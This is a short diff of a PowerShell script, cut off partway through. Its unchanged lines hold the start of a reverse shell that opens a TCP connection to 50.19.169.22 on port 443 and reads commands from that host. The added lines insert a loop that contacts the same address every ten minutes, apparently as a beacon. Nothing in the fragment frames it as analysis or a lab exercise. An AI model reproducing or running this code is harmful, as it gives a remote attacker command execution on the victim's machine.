@@ -1,3 +1,9 @@
+$j = 0
+while($j -lt 10000)
+{
+Test-NetConnection -ComputerName 50.19.169.22 -Port 80
+start-sleep -s 600
+$j++ }
 $client = New-Object System.Net.Sockets.TCPClient("50.19.169.22", 443); `
 $stream = $client.GetStream();[ byte []] $bytes = 0..65535|%{0}; `
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data `
